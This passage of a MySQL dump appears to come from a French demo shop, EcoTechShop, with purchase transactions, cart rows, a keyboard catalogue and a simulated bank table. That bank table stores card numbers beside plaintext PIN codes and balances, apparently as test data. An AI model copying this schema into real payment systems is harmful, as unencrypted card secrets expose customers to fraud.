(18, 68, 'Achat EcoTechShop (Auto-vérifié)', -45.00, '2026-03-17 16:14:28'),
(19, 87, 'Achat EcoTechShop (Auto-vérifié)', -696.75, '2026-03-18 19:57:54'),
(20, 87, 'Achat EcoTechShop (Auto-vérifié)', -696.75, '2026-03-18 20:01:07'),
(21, 87, 'Achat EcoTechShop (Auto-vérifié)', -696.75, '2026-03-18 20:08:47'),
(22, 87, 'Achat EcoTechShop (Auto-vérifié)', -696.75, '2026-03-18 20:14:53'),
(23, 88, 'Achat EcoTechShop (Auto-vérifié)', -696.75, '2026-03-18 20:17:31'),
(24, 88, 'Achat EcoTechShop (Auto-vérifié)', -696.75, '2026-03-18 20:23:35'),
(25, 89, 'Achat EcoTechShop (Auto-vérifié)', -1393.50, '2026-03-18 21:47:38'),
(26, 89, 'Achat EcoTechShop (Auto-vérifié)', -696.75, '2026-03-18 22:11:38'),
(27, 89, 'Achat EcoTechShop (Auto-vérifié)', -29.90, '2026-03-18 22:14:06'),
(28, 89, 'Achat EcoTechShop (Auto-vérifié)', -696.75, '2026-03-18 22:24:22'),
(29, 90, 'Achat EcoTechShop (Auto-vérifié)', -696.75, '2026-03-18 22:34:01'),
(30, 90, 'Achat EcoTechShop (Auto-vérifié)', -696.75, '2026-03-18 22:36:33'),
(31, 90, 'Achat EcoTechShop (Auto-vérifié)', -696.75, '2026-03-18 22:56:46'),
(32, 90, 'Achat EcoTechShop (Auto-vérifié)', -696.75, '2026-03-18 22:59:32'),
(33, 90, 'Achat EcoTechShop (Auto-vérifié)', -696.75, '2026-03-18 23:04:51'),
(34, 90, 'Achat EcoTechShop (Auto-vérifié)', -696.75, '2026-03-18 23:10:49'),
(35, 90, 'Achat EcoTechShop (Auto-vérifié)', -696.75, '2026-03-18 23:15:10'),
(36, 90, 'Achat EcoTechShop (Auto-vérifié)', -696.75, '2026-03-18 23:23:30'),
(37, 90, 'Achat EcoTechShop (Auto-vérifié)', -2489.90, '2026-03-18 23:41:21'),
(38, 91, 'Achat EcoTechShop (Auto-vérifié)', -29.90, '2026-03-19 12:22:22'),
(39, 91, 'Achat EcoTechShop (Auto-vérifié)', -1465.75, '2026-03-19 12:24:46'),
(40, 91, 'Achat EcoTechShop (Auto-vérifié)', -1198.60, '2026-03-19 12:26:22'),
(41, 91, 'Achat EcoTechShop (Auto-vérifié)', -29.90, '2026-03-19 13:27:51'),
(42, 91, 'Achat EcoTechShop (Auto-vérifié)', -59.80, '2026-03-19 13:58:42'),
(43, 91, 'Achat EcoTechShop (Auto-vérifié)', -59.80, '2026-03-19 14:04:24'),
(44, 91, 'Achat EcoTechShop (Auto-vérifié)', -59.80, '2026-03-19 14:05:01'),
(45, 91, 'Achat EcoTechShop (Auto-vérifié)', -59.80, '2026-03-19 14:09:51'),
(46, 91, 'Achat EcoTechShop (Auto-vérifié)', -29.90, '2026-03-19 14:10:32'),
(47, 92, 'Achat EcoTechShop (Auto-vérifié)', -29.90, '2026-03-19 16:22:40'),
(48, 92, 'Achat EcoTechShop (Auto-vérifié)', -1445.85, '2026-03-19 16:24:36'),
(49, 92, 'Achat EcoTechShop (Auto-vérifié)', -1445.85, '2026-03-19 16:33:17'),
(50, 92, 'Achat EcoTechShop (Auto-vérifié)', -1884.70, '2026-03-19 16:40:27'),
(51, 93, 'Achat EcoTechShop (Auto-vérifié)', -29.90, '2026-03-19 19:15:10'),
(52, 93, 'Achat EcoTechShop (Auto-vérifié)', -29.90, '2026-03-19 19:18:13'),
(53, 93, 'Achat EcoTechShop (Auto-vérifié)', -29.90, '2026-03-19 19:20:01'),
(54, 93, 'Achat EcoTechShop (Auto-vérifié)', -29.90, '2026-03-19 19:21:54'),
(55, 93, 'Achat EcoTechShop (Auto-vérifié)', -29.90, '2026-03-19 19:26:06'),
(56, 93, 'Achat EcoTechShop (Auto-vérifié)', -45.00, '2026-03-19 19:37:36'),
(57, 90, 'Achat EcoTechShop (Auto-vérifié)', -135.00, '2026-03-19 22:16:37'),
(58, 93, 'Achat EcoTechShop (Auto-vérifié)', -696.75, '2026-03-20 17:45:18'),
(59, 93, 'Achat EcoTechShop (Auto-vérifié)', -29.90, '2026-03-20 18:28:14'),
(60, 94, 'Achat EcoTechShop (Auto-vérifié)', -696.75, '2026-03-21 08:01:00'),
(61, 90, 'Achat EcoTechShop (Auto-vérifié)', -45.00, '2026-03-21 20:24:23'),
(62, 90, 'Achat EcoTechShop (Auto-vérifié)', -29.90, '2026-03-21 20:41:54'),
(63, 90, 'Achat EcoTechShop (Auto-vérifié)', -45.00, '2026-03-21 20:42:39'),
(64, 90, 'Achat EcoTechShop (Auto-vérifié)', -29.90, '2026-03-21 20:45:31'),
(65, 93, 'Achat EcoTechShop (Auto-vérifié)', -29.90, '2026-03-21 21:00:59'),
(66, 93, 'Achat EcoTechShop (Auto-vérifié)', -29.90, '2026-03-21 21:23:36'),
(67, 93, 'Achat EcoTechShop (Auto-vérifié)', -45.00, '2026-03-21 21:46:33'),
(68, 92, 'Achat EcoTechShop (Auto-vérifié)', -74.90, '2026-03-22 14:00:30'),
(69, 93, 'Achat EcoTechShop (Auto-vérifié)', -29.90, '2026-03-22 16:38:30'),
(70, 93, 'Achat EcoTechShop (Auto-vérifié)', -45.00, '2026-03-22 16:51:11'),
(71, 93, 'Achat EcoTechShop (Auto-vérifié)', -74.90, '2026-03-22 16:53:42'),
(72, 93, 'Achat EcoTechShop (Auto-vérifié)', -59.80, '2026-03-22 17:01:32'),
(73, 53, 'Achat EcoTechShop (Auto-vérifié)', -29.90, '2026-03-23 13:59:19'),
(74, 93, 'Achat EcoTechShop (Auto-vérifié)', -29.90, '2026-03-23 22:32:46'),
(75, 93, 'Achat EcoTechShop Multicatégorie', -29.90, '2026-03-23 22:55:02'),
(76, 93, 'Achat EcoTechShop Multicatégorie', -29.90, '2026-03-23 22:56:26'),
(77, 95, 'Achat EcoTechShop Multicatégorie', -29.90, '2026-03-23 23:19:35'),
(78, 95, 'Achat EcoTechShop Multicatégorie', -49.80, '2026-03-23 23:25:46'),
(79, 95, 'Achat EcoTechShop Multicatégorie', -696.75, '2026-03-23 23:30:25'),
(80, 95, 'Achat EcoTechShop Multicatégorie', -29.90, '2026-03-23 23:39:22'),
(81, 95, 'Achat EcoTechShop Multicatégorie', -90.00, '2026-03-23 23:41:16'),
(82, 97, 'Achat EcoTechShop Multicatégorie', -1262.55, '2026-03-25 13:31:12'),
(83, 99, 'Achat EcoTechShop Multicatégorie', -29.90, '2026-03-26 18:58:45'),
(84, 99, 'Achat EcoTechShop Multicatégorie', -29.90, '2026-03-26 19:05:00'),
(85, 101, 'Achat EcoTechShop Multicatégorie', -29.90, '2026-03-26 19:08:21'),
(86, 94, 'Achat EcoTechShop Multicatégorie', -902.00, '2026-03-26 23:07:32'),
(87, 99, 'Achat EcoTechShop Multicatégorie', -269.10, '2026-03-29 15:01:50'),
(88, 99, 'Achat EcoTechShop Multicatégorie', -135.00, '2026-03-29 15:02:48'),
(89, 98, 'Achat EcoTechShop Multicatégorie', -781.35, '2026-03-30 21:17:56'),
(90, 98, 'Achat EcoTechShop Multicatégorie', -696.75, '2026-03-30 21:19:25'),
(91, 98, 'Achat EcoTechShop Multicatégorie', -696.75, '2026-03-30 21:21:56'),
(92, 98, 'Achat EcoTechShop Multicatégorie', -696.75, '2026-03-30 21:24:12'),
(93, 98, 'Achat EcoTechShop Multicatégorie', -719.20, '2026-03-30 21:26:01'),
(94, 98, 'Achat EcoTechShop Multicatégorie', -696.75, '2026-03-30 21:29:45'),
(95, 98, 'Achat EcoTechShop Multicatégorie', -719.20, '2026-03-30 21:30:10'),
(96, 98, 'Achat EcoTechShop Multicatégorie', -719.20, '2026-03-30 21:48:46'),
(97, 98, 'Achat EcoTechShop Multicatégorie', -719.20, '2026-03-30 21:51:27'),
(98, 98, 'Achat EcoTechShop Multicatégorie', -719.20, '2026-03-30 21:55:11'),
(99, 98, 'Achat EcoTechShop Multicatégorie', -719.20, '2026-03-30 21:57:43'),
(100, 98, 'Achat EcoTechShop Multicatégorie', -719.20, '2026-03-30 22:14:11'),
(101, 103, 'Achat EcoTechShop Multicatégorie', -719.20, '2026-03-30 22:19:34'),
(102, 103, 'Achat EcoTechShop Multicatégorie', -719.20, '2026-03-30 22:22:55'),
(103, 103, 'Achat EcoTechShop Multicatégorie', -719.20, '2026-03-30 22:25:41'),
(104, 103, 'Achat EcoTechShop Multicatégorie', -719.20, '2026-03-30 22:26:26'),
(105, 103, 'Achat EcoTechShop Multicatégorie', -45.00, '2026-03-30 22:29:17'),
(106, 103, 'Achat EcoTechShop Multicatégorie', -45.00, '2026-03-30 22:38:59'),
(107, 94, 'Achat EcoTechShop Multicatégorie', -45.00, '2026-03-30 22:53:39'),
(108, 98, 'Achat EcoTechShop Multicatégorie', -45.00, '2026-03-30 22:58:40'),
(109, 97, 'Achat EcoTechShop Multicatégorie', -2039.15, '2026-03-31 09:22:33'),
(110, 105, 'Achat EcoTechShop Multicatégorie', -90.00, '2026-03-31 16:34:05'),
(111, 112, 'Achat EcoTechShop Multicatégorie', -29.90, '2026-04-09 17:34:01'),
(112, 113, 'Paiement externe : Achat Test Local', -100.00, '2026-04-09 20:09:43'),
(113, 113, 'Paiement externe : Achat Test Local', -100.00, '2026-04-09 20:13:18'),
(114, 113, 'Paiement externe : Achat Test Local', -100.00, '2026-04-09 20:16:41'),
(115, 112, 'Paiement externe : Achat Test Local', -100.00, '2026-04-09 20:21:15');

-- --------------------------------------------------------

--
-- Structure de la table `ecotechbank`
--

DROP TABLE IF EXISTS `ecotechbank`;
CREATE TABLE IF NOT EXISTS `ecotechbank` (
  `id_compte` int NOT NULL AUTO_INCREMENT,
  `id_client` int NOT NULL,
  `solde_bancaire` decimal(10,2) DEFAULT '0.00',
  `numero_carte_ecotech` varchar(16) DEFAULT NULL,
  `code_secret` varchar(20) DEFAULT NULL,
  PRIMARY KEY (`id_compte`),
  UNIQUE KEY `numero_carte_ecotech` (`numero_carte_ecotech`),
  KEY `id_client` (`id_client`)
) ENGINE=MyISAM AUTO_INCREMENT=91 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

--
-- Déchargement des données de la table `ecotechbank`
--

INSERT INTO `ecotechbank` (`id_compte`, `id_client`, `solde_bancaire`, `numero_carte_ecotech`, `code_secret`) VALUES
(1, 32, 1640.00, '4000479352762253', '9733'),
(2, 33, 6969.00, '4000743112701878', '4843'),
(3, 34, 5239.00, '4000206986405184', '7242'),
(4, 35, 9238.00, '4000240359912943', '8540'),
(5, 36, 4219.00, '4000724633551374', '2266'),
(6, 37, 5721.00, '4000382198009531', '8177'),
(7, 38, 3896.00, '4000439478634280', '5102'),
(8, 39, 5838.00, '4000106429251048', '3181'),
(9, 40, 7937.00, '4000295176925201', '5906'),
(10, 41, 8555.00, '4000811473155535', '6939'),
(11, 42, 5212.00, '4000900102337728', '5520'),
(12, 43, 1235.00, '4000215341159978', '7469'),
(13, 44, 8873.00, '4000359194824053', '8258'),
(14, 45, 2316.00, '4000294759132660', '7158'),
(15, 46, 6567.00, '4000217984064478', '6371'),
(16, 47, 6109.00, '4000692952183836', '5372'),
(17, 48, 7490.00, '4000138783559312', '3389'),
(18, 49, 6438.00, '4000754750367635', '4124'),
(19, 50, 6116.00, '4000617289113904', '4321'),
(20, 51, 4411.00, '4000237463378704', '5544'),
(21, 52, 9683.00, '4000529406099037', '9126'),
(22, 53, 1519.10, '4000506050547491', '2974'),
(23, 54, 8186.00, '4000917053744604', '1332'),
(24, 55, 5926.00, '4000818503637606', '8382'),
(25, 56, 4824.00, '4000162137201925', '9708'),
(26, 57, 2402.00, '4000628111394625', '5699'),
(27, 58, 2226.00, '4000889908344078', '9192'),
(28, 59, 1465.00, '4000309112901169', '7160'),
(29, 60, 8527.00, '4000200416037583', '9487'),
(30, 61, 2124.00, '4000358261112268', '1705'),
(31, 62, 6038.00, '4000233247795626', '1576'),
(32, 63, 5667.00, '4000148097727900', '2138'),
(33, 64, 9041.00, '4000704925347662', '6800'),
(34, 65, 1667.00, '4000213526019771', '1278'),
(35, 66, 2707.00, '4000524769795202', '9032'),
(36, 67, 5433.00, '4000993603985407', '6166'),
(37, 68, 144.90, '4000810619697386', '2373'),
(38, 69, 3624.00, '4000831536912588', '5960'),
(39, 70, 2488.90, '4000856152556952', '2164'),
(40, 71, 325.60, '4000743739211687', '1477'),
(41, 72, 8320.00, '4000934214237343', '1443'),
(42, 73, 5003.00, '4000917164401301', '4878'),
(43, 74, 4610.00, '4000461427032222', '9860'),
(44, 75, 1364.00, '4000646892723947', '1910'),
(45, 76, 5163.00, '4000915343656011', '3212'),
(46, 77, 7804.00, '4000657754061383', '6941'),
(47, 78, 2664.00, '4000741242853905', '5795'),
(48, 79, 4968.00, '4000888370202784', '8939'),
(49, 80, 2742.00, '4000408553538157', '6331'),
(50, 81, 3959.00, '4000340866343609', '8291'),
(51, 82, 4957.00, '4000327709781403', '7665'),
(52, 83, 4863.00, '4000387078069155', '5183'),
(53, 84, 5009.00, '4000451435169088', '4588'),
(54, 85, 6334.00, '4000552176493759', '1890'),
(55, 86, 6236.00, '4000505309375903', '5732'),
(56, 87, 55.00, '4000284696625251', '9282'),
(57, 88, 1628.50, '4000185426977295', '1844'),
(58, 89, 408.10, '4000682158429395', '7432'),
(59, 90, 102.30, '4000886317502746', '1449'),
(60, 91, 4998.75, '4000398457178707', '6927'),
(61, 92, 3789.80, '4000345156449263', '2596'),
(62, 93, 33.75, '4000189862517667', '6298'),
(63, 94, 678.25, '4000910243932778', '8123'),
(64, 95, 206.65, '4000545838645440', '7625'),
(65, 96, 1662.00, '4000542665186395', '6988'),
(66, 97, 2135.30, '4000558804742105', '4502'),
(67, 98, 786.25, '4000377175716033', '5420'),
(68, 99, 1363.10, '4000722620173013', '3421'),
(69, 100, 6393.00, '4000536564185399', '7932'),
(70, 101, 9568.10, '4000863295521169', '9828'),
(71, 102, 2253.00, '4000541443077936', '5796'),
(72, 103, 3729.20, '4000900356039793', '8634'),
(73, 104, 8223.00, '4000658911032724', '9974'),
(74, 105, 8134.00, '4000181828677946', '1146'),
(75, 106, 6138.00, '4000135964759878', '7503'),
(76, 107, 2294.00, '4000175600522767', '1521'),
(77, 108, 4238.00, '4000422056037912', '3653'),
(78, 109, 8126.00, '4000853710907002', '5081'),
(79, 110, 3282.00, '4000143576385293', '5126'),
(80, 111, 3150.00, '4000717525919165', '1331'),
(81, 112, 5509.10, '4000242402354772', '1158'),
(82, 113, 3889.00, '4000540527683047', '5061'),
(83, 114, 9513.00, '4000438950788111', '9619'),
(84, 115, 9926.00, '4000130317904801', '1131'),
(85, 116, 4922.00, '4000792326341230', '4265'),
(86, 117, 4456.00, '4000440871924140', '2748'),
(87, 118, 7481.00, '4000797280938411', '1473'),
(88, 119, 2026.00, '4000946307999523', '7295'),
(89, 120, 4417.00, '4000189983148518', '4207'),
(90, 121, 3710.00, '4000973066914679', '3863');

-- --------------------------------------------------------

--
-- Structure de la table `ecotechparnier`
--

DROP TABLE IF EXISTS `ecotechparnier`;
CREATE TABLE IF NOT EXISTS `ecotechparnier` (
  `id_parnier` int NOT NULL AUTO_INCREMENT,
  `id_client` int NOT NULL,
  `id_produit` int NOT NULL,
  `quantite_souhaitee` int DEFAULT '1',
  `categorie` varchar(50) DEFAULT 'produit',
  `prix_unitaire` decimal(10,2) DEFAULT '0.00',
  `table_origine` varchar(50) DEFAULT NULL,
  PRIMARY KEY (`id_parnier`),
  KEY `id_client` (`id_client`)
) ENGINE=MyISAM AUTO_INCREMENT=284 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

--
-- Déchargement des données de la table `ecotechparnier`
--

INSERT INTO `ecotechparnier` (`id_parnier`, `id_client`, `id_produit`, `quantite_souhaitee`, `categorie`, `prix_unitaire`, `table_origine`) VALUES
(1, 29, 2, 3, 'produit', 0.00, NULL),
(2, 29, 1, 2, 'produit', 0.00, NULL),
(3, 30, 1, 2, 'produit', 0.00, NULL),
(4, 30, 2, 1, 'produit', 0.00, NULL),
(5, 30, 5, 1, 'produit', 0.00, NULL),
(6, 30, 8, 1, 'produit', 0.00, NULL),
(7, 25, 1, 1, 'produit', 0.00, NULL),
(9, 32, 2, 1, 'produit', 0.00, NULL),
(10, 32, 7, 1, 'produit', 0.00, NULL),
(11, 32, 8, 1, 'produit', 0.00, NULL),
(12, 32, 5, 2, 'produit', 0.00, NULL),
(216, 68, 126, 1, 'sons', 29.90, NULL),
(16, 51, 104, 7, 'produit', 0.00, NULL),
(18, 54, 117, 4, 'produit', 0.00, NULL),
(19, 55, 117, 15, 'produit', 0.00, NULL),
(20, 55, 118, 7, 'produit', 0.00, NULL),
(21, 25, 117, 16, 'produit', 0.00, NULL),
(33, 25, 132, 1, 'produit', 0.00, NULL),
(34, 25, 136, 1, 'produit', 0.00, NULL),
(35, 25, 126, 2, 'produit', 0.00, NULL),
(44, 25, 119, 1, 'ecotechperiphs', 0.00, NULL),
(45, 25, 118, 1, 'ecotechperiphs', 0.00, NULL),
(40, 25, 117, 1, 'ecotechperiphs', 0.00, NULL),
(41, 25, 104, 1, 'produit', 0.00, NULL),
(51, 25, 122, 1, 'telephone', 0.00, NULL),
(46, 25, 118, 1, 'televisions', 0.00, NULL),
(47, 57, 118, 1, 'televisions', 0.00, NULL),
(213, 92, 126, 5, 'sons', 29.90, NULL),
(53, 32, 116, 3, 'produit', 0.00, NULL),
(50, 25, 117, 2, 'telephone', 0.00, NULL),
(124, 68, 162, 1, 'ecotechperiphs', 99.00, NULL),
(133, 87, 117, 1, 'telephone', 696.75, NULL),
(137, 68, 117, 1, 'produit', 19.90, NULL),
(142, 89, 117, 1, 'telephone', 696.75, NULL),
(211, 92, 117, 1, 'ecotechperiphs', 19.90, NULL),
(163, 91, 126, 1, 'sons', 29.90, NULL),
(99, 71, 114, 2, 'produit', 2039.15, NULL),
(125, 68, 150, 1, 'ecotechperiphs', 124.90, NULL),
(126, 68, 123, 1, 'ecotechperiphs', 14.90, NULL),
(214, 90, 126, 1, 'sons', 29.90, NULL),
(222, 93, 118, 1, 'ecotechperiphs', 19.90, 'ecotechstock'),
(239, 93, 126, 4, 'sons', 29.90, 'ecotechstock_sons'),
(279, 94, 117, 1, 'ecotechperiphs', 19.90, 'ecotechstock'),
(246, 93, 125, 2, 'sons', 45.00, 'ecotechstock_sons'),
(282, 116, 126, 3, 'sons', 29.90, 'ecotechstock_sons'),
(283, 119, 126, 1, 'sons', 29.90, 'ecotechstock_sons');

-- --------------------------------------------------------

--
-- Structure de la table `ecotechperiphs`
--

DROP TABLE IF EXISTS `ecotechperiphs`;
CREATE TABLE IF NOT EXISTS `ecotechperiphs` (
  `id_produit` int NOT NULL AUTO_INCREMENT,
  `id_externe` varchar(100) DEFAULT NULL,
  `nom` text NOT NULL,
  `description` text,
  `prix` decimal(10,2) DEFAULT NULL,
  `categories` text NOT NULL,
  `image` text,
  PRIMARY KEY (`id_produit`),
  UNIQUE KEY `id_externe` (`id_externe`)
) ENGINE=MyISAM AUTO_INCREMENT=176 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

--
-- Déchargement des données de la table `ecotechperiphs`
--

INSERT INTO `ecotechperiphs` (`id_produit`, `id_externe`, `nom`, `description`, `prix`, `categories`, `image`) VALUES
(117, 'AR201907020028', 'LDLC BW10 (AZERTY, Belge)', 'Clavier filaire - résiste aux éclaboussures (AZERTY, Belge)', 19.90, 'Périphériques', 'https://media.ldlc.com/r150/ld/products/00/05/48/48/LD0005484889_2.jpg'),
(118, 'AR201907020029', 'LDLC BW10 (QWERTY, Espagnol)', 'Clavier filaire - résiste aux éclaboussures (QWERTY, Espagnol)', 19.90, 'Périphériques', 'https://media.ldlc.com/r150/ld/products/00/05/48/49/LD0005484933_2.jpg'),
(119, 'AR201907020027', 'LDLC BW10 (QWERTZ, Suisse)', 'Clavier filaire - résiste aux éclaboussures (QWERTZ, Suisse)', 19.90, 'Périphériques', 'https://media.ldlc.com/r150/ld/products/00/05/53/51/LD0005535192_2.jpg'),
(120, 'AR202403060056', 'INOVU AT200MK Noir (AZERTY)', 'Clavier multimédia sans fil avec touchpad - RF 2.4 GHz - AZERTY, Français', 34.95, 'Périphériques', 'https://media.ldlc.com/r150/ld/products/00/06/15/89/LD0006158954.jpg'),
(121, 'AR202010280097', 'INOVU BW10 (AZERTY, Français)', 'Clavier filaire - résiste aux éclaboussures (AZERTY, Français)', 14.90, 'Périphériques', 'https://media.ldlc.com/r150/ld/products/00/05/84/23/LD0005842315_1.jpg'),
(122, 'AR202208160050', 'INOVU BW10 (QWERTY, Intl)', 'Clavier filaire - résiste aux éclaboussures (QWERTY, International)', 14.90, 'Périphériques', 'https://media.ldlc.com/r150/ld/products/00/06/01/69/LD0006016926.jpg'),
(123, 'AR202505200077', 'INOVU BW10 (QWERTY, Italien)', 'Clavier filaire - résiste aux éclaboussures (QWERTY, Italien)', 14.90, 'Périphériques', 'https://media.ldlc.com/r150/ld/products/00/06/29/02/LD0006290236.jpg'),
(124, 'AR202208160045', 'INOVU BW10 AZERTY+', 'Clavier filaire AZERTY amélioré - résiste aux éclaboussures', 17.50, 'Périphériques', 'https://media.ldlc.com/r150/ld/products/00/06/01/69/LD0006016915.jpg'),
(125, 'AR202208160049', 'INOVU BW10 BEPO', 'Clavier filaire BEPO - résiste aux éclaboussures (BEPO, Français)', 24.90, 'Périphériques', 'https://media.ldlc.com/r150/ld/products/00/06/01/69/LD0006016945.jpg'),
(126, 'AR202303170016', 'INOVU LK120 (AZERTY)', 'Clavier filaire rétroéclairé slim avec touches multimédia - AZERTY', 29.90, 'Périphériques', 'https://media.ldlc.com/r150/ld/products/00/06/11/39/LD0006113909.jpg'),
(127, 'AR202006150099', 'INOVU SWL10 Blanc (Solaire)', 'Clavier sans fil RF - énergie solaire - AZERTY, Français', 49.95, 'Périphériques', 'https://media.ldlc.com/r150/ld/products/00/05/53/20/LD0005532088_2_0005745763.jpg'),
(128, 'AR202006150094', 'INOVU SWL10 Noir (Solaire)', 'Clavier sans fil RF - énergie solaire - AZERTY, Français', 49.95, 'Périphériques', 'https://media.ldlc.com/r150/ld/products/00/05/53/20/LD0005532016_2_0005745783.jpg'),
(129, 'AR202011260100', 'Clavier Lavable Trackpad', 'Clavier lavable et désinfectable avec trackpad intégré - AZERTY', 89.00, 'Périphériques', 'https://media.ldlc.com/r150/ld/products/00/05/76/16/LD0005761658_1.jpg'),
(130, 'AR202111190064', '3Dconnexion Keyboard Pro', 'Clavier filaire compact avec pavé numérique séparé sans fil - AZERTY', 129.00, 'Périphériques', 'https://media.ldlc.com/r150/ld/products/00/05/90/75/LD0005907598_1.jpg'),
(131, 'AR202509120030', '8Bitdo Retro 108 Famicom', 'Clavier sans fil gamer - interrupteurs mécaniques Kailh Box White v2 - QWERTY', 119.90, 'Périphériques', 'https://media.ldlc.com/r150/ld/products/00/06/31/26/LD0006312656.jpg'),
(132, 'AR202509120031', '8Bitdo Retro 108 NES', 'Clavier sans fil gamer - interrupteurs mécaniques Kailh Box White v2 - QWERTY', 119.90, 'Périphériques', 'https://media.ldlc.com/r150/ld/products/00/06/31/26/LD0006312652.jpg'),
(133, 'AR202509120026', '8Bitdo Retro 87 Mecha BREAK', 'Clavier sans fil gamer TKL - interrupteurs mécaniques Kailh Jellyfish X - QWERTY', 99.90, 'Périphériques', 'https://media.ldlc.com/r150/ld/products/00/06/31/27/LD0006312749.jpg'),
(134, 'AR202509120027', '8Bitdo Retro 87 Xbox Edition', 'Clavier sans fil gamer TKL - interrupteurs mécaniques Kailh Jellyfish X - QWERTY', 99.90, 'Périphériques', 'https://media.ldlc.com/r150/ld/products/00/06/31/27/LD0006312739.jpg'),
(135, 'AR202503100050', 'Advance EzyType', 'Clavier filaire - 12 raccourcis multimédias - AZERTY, Français', 12.90, 'Périphériques', 'https://media.ldlc.com/r150/ld/products/00/06/22/80/LD0006228025.jpg'),
(136, 'AR202503100052', 'Advance GTA 220', 'Clavier gaming - interrupteurs à membrane - rétroéclairage RGB - AZERTY', 19.95, 'Périphériques', 'https://media.ldlc.com/r150/ld/products/00/06/22/82/LD0006228211.jpg'),
(137, 'AR202503100053', 'Advance GTA 240', 'Clavier gaming - touches semi-mécaniques - rétroéclairage RGB - AZERTY', 24.90, 'Périphériques', 'https://media.ldlc.com/r150/ld/products/00/06/22/82/LD0006228291.jpg'),
(138, 'AR202408290029', 'Advance R-Type Blanc', 'Clavier gamer sans fil - rétroéclairage RGB - résistant aux éclaboussures', 34.90, 'Périphériques', 'https://media.ldlc.com/r150/ld/products/00/06/16/58/LD0006165899.jpg'),
(139, 'AR202408290028', 'Advance R-Type Noir', 'Clavier gamer sans fil - rétroéclairage RGB - résistant aux éclaboussures', 34.90, 'Périphériques', 'https://media.ldlc.com/r150/ld/products/00/06/16/58/LD0006165894.jpg'),
(140, 'AR202411070073', 'Advance SMARTKEY PLUS', 'Clavier sans fil rechargeable - AZERTY, Français', 29.95, 'Périphériques', 'https://media.ldlc.com/r150/ld/products/00/06/19/16/LD0006191639.jpg'),
(141, 'AR202404230170', 'Advance WorkMate', 'Clavier filaire simple et robuste - AZERTY, Français', 9.90, 'Périphériques', 'https://media.ldlc.com/r150/ld/products/00/06/13/11/LD0006131156.jpg'),
(142, 'AR202410290039', 'Apple Magic Keyboard', 'Clavier sans fil compact Bluetooth rechargeable - AZERTY, Français', 109.00, 'Périphériques', 'https://media.ldlc.com/r150/ld/products/00/06/18/34/LD0006183451.jpg'),
(143, 'AR202410290037', 'Apple Magic Keyboard Touch ID', 'Clavier sans fil avec Touch ID pour Mac puce Apple - AZERTY', 159.00, 'Périphériques', 'https://media.ldlc.com/r150/ld/products/00/06/18/34/LD0006183450.jpg'),
(144, 'AR202410290041', 'Apple Magic Keyboard Num Touches Blanches', 'Clavier sans fil avec pavé numérique et Touch ID - Blanc', 189.00, 'Périphériques', 'https://media.ldlc.com/r150/ld/products/00/06/18/34/LD0006183457.jpg'),
(145, 'AR202410290042', 'Apple Magic Keyboard Num Touches Noires', 'Clavier sans fil avec pavé numérique et Touch ID - Noir', 209.00, 'Périphériques', 'https://media.ldlc.com/r150/ld/products/00/06/18/34/LD0006183458.jpg'),
(146, 'AR202312070048', 'ASUS ROG Azoth Blanc', 'Clavier gaming 75% - mécanique ROG NX Red - écran OLED - RGB', 249.00, 'Périphériques', 'https://media.ldlc.com/r150/ld/products/00/06/09/07/LD0006090719.jpg'),
(147, 'AR202407080013', 'ASUS ROG Azoth Extreme', 'Clavier gaming 75% - mécanique ROG NX Snow - écran OLED - RGB', 499.00, 'Périphériques', 'https://media.ldlc.com/r150/ld/products/00/06/15/96/LD0006159664.jpg'),
(148, 'AR202506040078', 'ASUS ROG Azoth X', 'Clavier gaming 75% - mécanique ROG NX Snow v2 - écran OLED - RGB', 279.00, 'Périphériques', 'https://media.ldlc.com/r150/ld/products/00/06/25/71/LD0006257153.jpg'),
(149, 'AR202506040077', 'ASUS ROG Falcata', 'Clavier gaming 75% scindable - interrupteurs magnétiques ROG HFX V2', 299.00, 'Périphériques', 'https://media.ldlc.com/r150/ld/products/00/06/26/91/LD0006269153.jpg'),
(150, 'AR202301090198', 'ASUS ROG Falchion Ace Noir', 'Clavier gaming filaire 65% - mécanique ROG NX Red - RGB Aura Sync', 124.90, 'Périphériques', 'https://media.ldlc.com/r150/ld/products/00/06/00/71/LD0006007126.jpg'),
(151, 'AR202601160011', 'ASUS ROG Falchion Ace 75 HE', 'Clavier gaming filaire 75% - interrupteurs magnétiques ROG HFX V2', 169.00, 'Périphériques', 'https://media.ldlc.com/r150/ld/products/00/06/31/55/LD0006315598.jpg'),
(152, 'AR202409050010', 'ASUS ROG Falchion Ace HFX', 'Clavier gaming filaire 65% - interrupteurs magnétiques ROG HFX', 199.00, 'Périphériques', 'https://media.ldlc.com/r150/ld/products/00/06/17/30/LD0006173068.jpg'),
(153, 'AR202510170023', 'ASUS ROG Falchion Ace Zywoo Ed.', 'Clavier gaming filaire 65% - Edition Spéciale Zywoo - Magnétique', 219.00, 'Périphériques', 'https://media.ldlc.com/r150/ld/products/00/06/29/42/LD0006294275.jpg'),
(154, 'AR202502270046', 'ASUS ROG Falchion NX Noir', 'Clavier gaming sans fil 65% - mécanique ROG NX - Panneau tactile', 149.00, 'Périphériques', 'https://media.ldlc.com/r150/ld/products/00/06/22/71/LD0006227157.jpg'),
(155, 'AR202401100096', 'ASUS ROG Falchion RX Low Profile', 'Clavier gaming sans fil 60% - optique RX Red Low Profile', 189.00, 'Périphériques', 'https://media.ldlc.com/r150/ld/products/00/06/10/10/LD0006101073.jpg'),
(156, 'AR202410080055', 'ASUS ROG Strix Scope II 96 RX', 'Clavier gaming sans fil - interrupteurs optiques ROG RX - RGB', 179.00, 'Périphériques', 'https://media.ldlc.com/r150/ld/products/00/06/05/10/LD0006051086_0006189492.jpg'),
(157, 'AR202306120011', 'ASUS ROG Strix Scope II 96 Wireless', 'Clavier gaming sans fil - interrupteurs ROG NX Snow - RGB', 169.00, 'Périphériques', 'https://media.ldlc.com/r150/ld/products/00/06/05/10/LD0006051086.jpg'),
(158, 'AR202405270027', 'ASUS ROG Strix Scope II 96 Blanc', 'Clavier gaming sans fil - interrupteurs ROG NX Snow - Blanc', 169.00, 'Périphériques', 'https://media.ldlc.com/r150/ld/products/00/06/14/48/LD0006144802.jpg'),
(159, 'AR202310090033', 'ASUS ROG Strix Scope II RX', 'Clavier gaming IP57 - optique ROG RX Red - RGB Aura Sync', 139.00, 'Périphériques', 'https://media.ldlc.com/r150/ld/products/00/06/07/71/LD0006077189.jpg'),
